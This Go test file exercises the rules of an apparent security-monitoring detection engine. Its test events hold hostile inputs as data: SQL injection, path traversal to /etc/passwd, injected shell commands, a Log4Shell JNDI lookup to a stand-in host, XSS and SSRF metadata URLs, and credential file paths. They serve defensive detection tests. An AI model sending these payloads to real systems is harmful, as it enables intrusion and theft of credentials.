package service_test

import (
	"context"
	"lightweight-security-monitoring/internal/domain"
	"lightweight-security-monitoring/internal/repository"
	"lightweight-security-monitoring/internal/service"
	"slices"
	"strconv"
	"testing"
	"time"
)

// newEngine returns an engine loaded with the embedded default rules.
func newEngine(t *testing.T) *service.DetectionEngine {
	t.Helper()
	rules, err := service.DefaultRules()
	if err != nil {
		t.Fatalf("DefaultRules: %v", err)
	}
	engine, err := service.NewDetectionEngine(rules)
	if err != nil {
		t.Fatalf("NewDetectionEngine: %v", err)
	}
	return engine
}

// pipeline mimics the ingestion service: every event is stored and evaluated,
// and generated alerts are stored so cooldowns and correlation see them.
type pipeline struct {
	t      *testing.T
	engine *service.DetectionEngine
	store  *repository.MemoryStore
}

func newPipeline(t *testing.T) *pipeline {
	return &pipeline{t: t, engine: newEngine(t), store: repository.NewMemoryStore()}
}

func (p *pipeline) ingest(event domain.Event) (*domain.Alert, bool) {
	p.t.Helper()
	ctx := context.Background()
	if err := p.store.SaveEvent(ctx, event); err != nil {
		p.t.Fatal(err)
	}
	alert, triggered := p.engine.Evaluate(ctx, event, p.store, p.store)
	if triggered {
		if err := p.store.SaveAlert(ctx, *alert); err != nil {
			p.t.Fatal(err)
		}
	}
	return alert, triggered
}

// feed ingests n events from ip, one second apart and ending now, and returns
// the alerts that were generated. opts receive the index of the event.
func (p *pipeline) feed(ip string, eventType domain.EventType, n int, opts ...func(int, *domain.Event)) []*domain.Alert {
	p.t.Helper()
	start := time.Now().UTC().Add(-time.Duration(n) * time.Second)
	var alerts []*domain.Alert
	for i := range n {
		e := domain.Event{ID: "feed", IP: ip, EventType: eventType, Timestamp: start.Add(time.Duration(i+1) * time.Second)}
		for _, o := range opts {
			o(i, &e)
		}
		if alert, ok := p.ingest(e); ok {
			alerts = append(alerts, alert)
		}
	}
	return alerts
}

func newEvent(ip string, eventType domain.EventType, opts ...func(*domain.Event)) domain.Event {
	e := domain.Event{
		ID:        "test-event",
		IP:        ip,
		EventType: eventType,
		Timestamp: time.Now().UTC(),
	}
	for _, o := range opts {
		o(&e)
	}
	return e
}

func withPath(p string) func(*domain.Event)      { return func(e *domain.Event) { e.Path = p } }
func withMessage(m string) func(*domain.Event)   { return func(e *domain.Event) { e.Message = m } }
func withUserAgent(u string) func(*domain.Event) { return func(e *domain.Event) { e.UserAgent = u } }

func ruleNames(alerts []*domain.Alert) []string {
	var names []string
	for _, a := range alerts {
		names = append(names, a.TriggerRule)
	}
	return names
}

func expectRule(t *testing.T, event domain.Event, rule string) *domain.Alert {
	t.Helper()
	alert, triggered := newPipeline(t).ingest(event)
	if !triggered {
		t.Fatalf("expected %s alert for %+v, got none", rule, event)
	}
	if alert.TriggerRule != rule {
		t.Fatalf("expected TriggerRule=%s, got %s (reason: %s)", rule, alert.TriggerRule, alert.Reason)
	}
	return alert
}

func expectNoAlert(t *testing.T, event domain.Event) {
	t.Helper()
	if alert, triggered := newPipeline(t).ingest(event); triggered {
		t.Fatalf("expected no alert for %+v, got %s: %s", event, alert.TriggerRule, alert.Reason)
	}
}

// ── BruteForce ────────────────────────────────────────────────────────────────

func TestBruteForceRule_BelowThreshold(t *testing.T) {
	if alerts := newPipeline(t).feed("10.0.0.1", domain.EventFailedLogin, 4); len(alerts) > 0 {
		t.Errorf("expected no alert below threshold, got %v", ruleNames(alerts))
	}
}

func TestBruteForceRule_AtThreshold(t *testing.T) {
	alerts := newPipeline(t).feed("10.0.0.2", domain.EventFailedLogin, 5)
	if len(alerts) != 1 {
		t.Fatalf("expected exactly one alert on the 5th attempt, got %v", ruleNames(alerts))
	}
	if alerts[0].TriggerRule != "BruteForce" || alerts[0].Severity != domain.SeverityHigh || alerts[0].EventCount != 5 {
		t.Errorf("unexpected alert %+v", alerts[0])
	}
}

func TestBruteForceRule_DifferentIP(t *testing.T) {
	p := newPipeline(t)
	p.feed("10.0.0.99", domain.EventFailedLogin, 10)

	if alert, triggered := p.ingest(newEvent("10.0.0.3", domain.EventFailedLogin)); triggered {
		t.Errorf("alert should not fire for a different IP, got %s", alert.TriggerRule)
	}
}

func TestBruteForceRule_SlowAttemptsLeaveTheWindow(t *testing.T) {
	p := newPipeline(t)
	start := time.Now().UTC()
	// 10 attempts, 20 s apart: never more than 3 within the 1-minute window.
	for i := range 10 {
		e := newEvent("10.0.0.4", domain.EventFailedLogin)
		e.Timestamp = start.Add(time.Duration(i) * 20 * time.Second)
		if alert, triggered := p.ingest(e); triggered {
			t.Fatalf("attempt %d: unexpected %s alert (count %d)", i, alert.TriggerRule, alert.EventCount)
		}
	}
}

func TestBruteForceRule_OutOfOrderEventsCount(t *testing.T) {
	p := newPipeline(t)
	now := time.Now().UTC()
	var last *domain.Alert
	for _, offset := range []int{0, -10, -5, -20, -15} { // all within one minute, shuffled
		e := newEvent("10.0.0.5", domain.EventFailedLogin)
		e.Timestamp = now.Add(time.Duration(offset) * time.Second)
		last, _ = p.ingest(e)
	}
	if last == nil || last.TriggerRule != "BruteForce" {
		t.Fatalf("expected BruteForce after 5 out-of-order attempts, got %+v", last)
	}
}

// ── SQLInjection ──────────────────────────────────────────────────────────────

func TestSQLInjectionRule_Matches(t *testing.T) {
	cases := map[string]domain.Event{
		"path":        newEvent("10.0.0.4", domain.EventHTTPRequest, withPath("/search?q=' OR 1=1--")),
		"message":     newEvent("10.0.0.5", domain.EventHTTPRequest, withMessage("SELECT * FROM users; DROP TABLE users;")),
		"url-encoded": newEvent("10.0.0.4", domain.EventHTTPRequest, withPath("/search?q=%27%20OR%201%3D1")),
		"plus-spaces": newEvent("10.0.0.4", domain.EventHTTPRequest, withPath("/search?q='+or+'a'='a")),
		"union":       newEvent("10.0.0.4", domain.EventHTTPRequest, withPath("/item?id=1 UNION/**/SELECT password FROM users")),
		"time-based":  newEvent("10.0.0.4", domain.EventHTTPRequest, withPath("/item?id=1 AND SLEEP(5)")),
	}
	for name, event := range cases {
		t.Run(name, func(t *testing.T) { expectRule(t, event, "SQLInjection") })
	}
}

func TestSQLInjectionRule_NoFalsePositives(t *testing.T) {
	cases := map[string]domain.Event{
		"clean path":     newEvent("10.0.0.6", domain.EventHTTPRequest, withPath("/api/users/42")),
		"double dash":    newEvent("10.0.0.6", domain.EventHTTPRequest, withPath("/blog/2026--recap")),
		"quoted message": newEvent("10.0.0.6", domain.EventHTTPRequest, withMessage("user 'bob' or email changed")),
	}
	for name, event := range cases {
		t.Run(name, func(t *testing.T) { expectNoAlert(t, event) })
	}
}

// ── PathTraversal ─────────────────────────────────────────────────────────────

func TestPathTraversalRule(t *testing.T) {
	cases := map[string]string{
		"plain":          "/download?file=../../etc/passwd",
		"url-encoded":    "/download?file=..%2f..%2fetc%2fpasswd",
		"double-encoded": "/download?file=%252e%252e%252fsecret",
		"windows":        "/download?file=..\\..\\boot.ini",
	}
	for name, path := range cases {
		t.Run(name, func(t *testing.T) {
			alert := expectRule(t, newEvent("10.0.1.1", domain.EventHTTPRequest, withPath(path)), "PathTraversal")
			if alert.EventType != domain.EventPathTraversal {
				t.Errorf("expected alert type %s, got %s", domain.EventPathTraversal, alert.EventType)
			}
		})
	}
}

// ── CommandInjection ──────────────────────────────────────────────────────────

func TestCommandInjectionRule(t *testing.T) {
	cases := map[string]domain.Event{
		"semicolon": newEvent("10.0.2.1", domain.EventHTTPRequest, withPath("/ping?host=127.0.0.1;id")),
		"encoded":   newEvent("10.0.2.1", domain.EventHTTPRequest, withPath("/ping?host=127.0.0.1%7C%7Cwhoami")),
		"subshell":  newEvent("10.0.2.1", domain.EventHTTPRequest, withPath("/ping?host=$(uname -a)")),
		"log4shell": newEvent("10.0.2.1", domain.EventHTTPRequest, withUserAgent("${jndi:ldap://evil.example/a}")),
	}
	for name, event := range cases {
		t.Run(name, func(t *testing.T) {
			alert := expectRule(t, event, "CommandInjection")
			if alert.Severity != domain.SeverityCritical {
				t.Errorf("expected SeverityCritical, got %s", alert.Severity)
			}
		})
	}
}

func TestCommandInjectionRule_QueryParamNamedIDIsClean(t *testing.T) {
	expectNoAlert(t, newEvent("10.0.2.2", domain.EventHTTPRequest, withPath("/orders?page=2&id=5")))
}

// ── XSS / SSRF / Scanner ──────────────────────────────────────────────────────

func TestXSSRule(t *testing.T) {
	expectRule(t, newEvent("10.0.3.1", domain.EventHTTPRequest, withPath("/search?q=<script>alert(1)</script>")), "XSS")
	expectRule(t, newEvent("10.0.3.1", domain.EventHTTPRequest, withPath("/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E")), "XSS")
}

func TestSSRFRule(t *testing.T) {
	expectRule(t, newEvent("10.0.3.2", domain.EventHTTPRequest, withPath("/fetch?url=http://169.254.169.254/latest/meta-data/")), "SSRF")
	expectRule(t, newEvent("10.0.3.2", domain.EventHTTPRequest, withPath("/fetch?url=http://localhost:6379/")), "SSRF")
}

func TestScannerUserAgentRule(t *testing.T) {
	expectRule(t, newEvent("10.0.3.3", domain.EventHTTPRequest, withPath("/"), withUserAgent("sqlmap/1.7.2#stable")), "ScannerUserAgent")
	expectNoAlert(t, newEvent("10.0.3.3", domain.EventHTTPRequest, withPath("/"), withUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")))
}

// ── SensitivePath ─────────────────────────────────────────────────────────────

func TestSensitivePathRule(t *testing.T) {
	for _, path := range []string{"/admin/login", "/api/.env", "/.git/config", "/app/.aws/credentials", "/config.php"} {
		t.Run(path, func(t *testing.T) {
			expectRule(t, newEvent("10.0.0.7", domain.EventHTTPRequest, withPath(path)), "SensitivePath")
		})
	}
}

func TestSensitivePathRule_NoFalsePositives(t *testing.T) {
	for _, path := range []string{"/api/v1/status", "/configuration-guide", "/blog/admin-tips", "/environment"} {
		t.Run(path, func(t *testing.T) {
			expectNoAlert(t, newEvent("10.0.0.8", domain.EventHTTPRequest, withPath(path)))
		})
	}
}

// ── Threshold rules ───────────────────────────────────────────────────────────

func TestRapidFireRule_HighVolume(t *testing.T) {
	alerts := newPipeline(t).feed("10.0.0.9", domain.EventHTTPRequest, 20)
	if len(alerts) != 1 || alerts[0].TriggerRule != "RapidFire" {
		t.Fatalf("expected one RapidFire alert on the 20th request, got %v", ruleNames(alerts))
	}
}

func TestPortScanRule_DistinctPorts(t *testing.T) {
	alerts := newPipeline(t).feed("10.0.4.1", domain.EventPortScan, 10, func(i int, e *domain.Event) { e.Port = 20 + i })
	if len(alerts) != 1 || alerts[0].TriggerRule != "PortScan" {
		t.Fatalf("expected one PortScan alert, got %v", ruleNames(alerts))
	}
	if alerts[0].EventCount != 10 {
		t.Errorf("expected 10 distinct ports, got %d", alerts[0].EventCount)
	}
}

func TestPortScanRule_SamePortDoesNotTrigger(t *testing.T) {
	alerts := newPipeline(t).feed("10.0.4.2", domain.EventHTTPRequest, 16, func(_ int, e *domain.Event) { e.Port = 443 })
	if len(alerts) > 0 {
		t.Errorf("repeated connections to one port must not look like a port scan, got %v", ruleNames(alerts))
	}
}

func TestPortScanRule_PortsExpireFromWindow(t *testing.T) {
	p := newPipeline(t)
	start := time.Now().UTC()
	// 20 distinct ports, but only one every 10 s: at most 6 within the minute.
	for i := range 20 {
		e := newEvent("10.0.4.4", domain.EventPortScan, func(e *domain.Event) { e.Port = 1000 + i })
		e.Timestamp = start.Add(time.Duration(i) * 10 * time.Second)
		if alert, triggered := p.ingest(e); triggered {
			t.Fatalf("port %d: unexpected %s alert (count %d)", e.Port, alert.TriggerRule, alert.EventCount)
		}
	}
}

func TestDirectoryEnumerationRule(t *testing.T) {
	alerts := newPipeline(t).feed("10.0.4.3", domain.EventHTTPRequest, 15, func(_ int, e *domain.Event) { e.StatusCode = 404 })
	if len(alerts) != 1 || alerts[0].TriggerRule != "DirectoryEnumeration" {
		t.Fatalf("expected one DirectoryEnumeration alert, got %v", ruleNames(alerts))
	}
}

// ── Engine behaviour ──────────────────────────────────────────────────────────

func TestEngine_HighestSeverityWins(t *testing.T) {
	p := newPipeline(t)
	// 19 requests, then a SQL injection as the 20th: RapidFire (medium) and SQLInjection (high) fire together.
	p.feed("10.0.5.1", domain.EventHTTPRequest, 19)

	alert, triggered := p.ingest(newEvent("10.0.5.1", domain.EventHTTPRequest, withPath("/search?q=' OR 1=1--")))
	if !triggered {
		t.Fatal("expected an alert")
	}
	if alert.TriggerRule != "SQLInjection" {
		t.Errorf("expected SQLInjection to win over RapidFire, got %s", alert.TriggerRule)
	}
	if !slices.Contains(alert.RelatedRules, "RapidFire") {
		t.Errorf("expected RapidFire in RelatedRules, got %v", alert.RelatedRules)
	}
}

func TestEngine_CooldownSuppressesDuplicates(t *testing.T) {
	p := newPipeline(t)
	event := newEvent("10.0.5.2", domain.EventHTTPRequest, withPath("/.env"))

	if _, triggered := p.ingest(event); !triggered {
		t.Fatal("expected first alert")
	}

	event.Timestamp = event.Timestamp.Add(30 * time.Second)
	if alert, triggered := p.ingest(event); triggered {
		t.Errorf("expected duplicate within cooldown to be suppressed, got %s", alert.TriggerRule)
	}

	event.Timestamp = event.Timestamp.Add(time.Minute)
	if _, triggered := p.ingest(event); !triggered {
		t.Error("expected alert again after cooldown expired")
	}
}

func TestEngine_MultiVectorCorrelation(t *testing.T) {
	p := newPipeline(t)
	ip := "10.0.5.3"

	steps := []domain.Event{
		newEvent(ip, domain.EventHTTPRequest, withPath("/.env")),
		newEvent(ip, domain.EventHTTPRequest, withPath("/search?q=' OR 1=1--")),
		newEvent(ip, domain.EventHTTPRequest, withPath("/search?q=<script>alert(1)</script>")),
	}
	var last *domain.Alert
	for i, event := range steps {
		event.Timestamp = event.Timestamp.Add(time.Duration(i) * time.Second)
		alert, triggered := p.ingest(event)
		if !triggered {
			t.Fatalf("step %d: expected an alert", i)
		}
		last = alert
	}

	if last.TriggerRule != "MultiVector" || last.Severity != domain.SeverityCritical {
		t.Fatalf("expected critical MultiVector alert, got %s (%s)", last.TriggerRule, last.Severity)
	}
	if !slices.Contains(last.RelatedRules, "XSS") {
		t.Errorf("expected XSS in RelatedRules, got %v", last.RelatedRules)
	}
}

func TestEngine_PruneReleasesRuleState(t *testing.T) {
	p := newPipeline(t)
	p.feed("10.0.5.9", domain.EventFailedLogin, 4)

	// After pruning far in the future the old attempts are gone: 4 more do not reach 5.
	p.engine.Prune(time.Now().Add(time.Hour))
	if alerts := p.feed("10.0.5.9", domain.EventFailedLogin, 4); len(alerts) > 0 {
		t.Errorf("expected no alert after prune, got %v", ruleNames(alerts))
	}
}

// ── Network rules ─────────────────────────────────────────────────────────────

func TestNetworkSweepRule(t *testing.T) {
	alerts := newPipeline(t).feed("10.0.6.1", domain.EventFirewallBlock, 10, func(i int, e *domain.Event) {
		e.DstIP = "192.0.2." + strconv.Itoa(100+i)
		e.Port = 22
	})
	if len(alerts) != 1 || alerts[0].TriggerRule != "NetworkSweep" || alerts[0].EventCount != 10 {
		t.Fatalf("expected one NetworkSweep alert over 10 hosts, got %v", ruleNames(alerts))
	}
}

func TestBlockedConnectionFloodRule(t *testing.T) {
	start := time.Now().UTC().Add(-time.Minute)
	// 100 blocked packets within 10 s (feed's 1 s spacing would spread them over more than the window).
	alerts := newPipeline(t).feed("10.0.6.2", domain.EventFirewallBlock, 100, func(i int, e *domain.Event) {
		e.DstIP, e.Port = "192.0.2.10", 443
		e.Timestamp = start.Add(time.Duration(i) * 100 * time.Millisecond)
	})
	if len(alerts) != 1 || alerts[0].TriggerRule != "BlockedConnectionFlood" {
		t.Fatalf("expected one BlockedConnectionFlood alert, got %v", ruleNames(alerts))
	}
}

func TestRapidFireRule_IgnoresNetworkEvents(t *testing.T) {
	// A busy but legitimate client: 50 allowed connections to one service.
	alerts := newPipeline(t).feed("10.0.6.3", domain.EventNetworkConnection, 50, func(_ int, e *domain.Event) {
		e.DstIP, e.Port = "192.0.2.10", 443
	})
	if len(alerts) > 0 {
		t.Errorf("allowed network connections must not trigger volume rules, got %v", ruleNames(alerts))
	}
}
